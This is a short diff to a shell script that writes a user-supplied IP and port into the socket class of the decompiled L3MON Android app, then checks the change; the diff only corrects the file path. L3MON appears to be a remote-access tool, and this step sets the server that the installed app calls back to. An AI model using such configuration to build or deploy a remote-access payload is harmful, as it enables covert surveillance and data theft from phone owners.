@@ -16,7 +16,7 @@ read ports
 
 echo -e "const-string v3, \"http://$ips:$ports?model=\"" >.lmn.txt
 chg=$(cat .lmn.txt)
-sed -i "77 c $chg" $HOME/L3MON/server/app/factory/decompiled/smali/com/etechd/l3mon/IOSocket.smali
+sed -i "77 c $chg" $HOME/L3MON/app/factory/decompiled/smali/com/etechd/l3mon/IOSocket.smali
 echo "Checking changes..."
 sleep 3
 cat $HOME/L3MON/app/factory/decompiled/smali/com/etechd/l3mon/IOSocket.smali |grep -E "http"
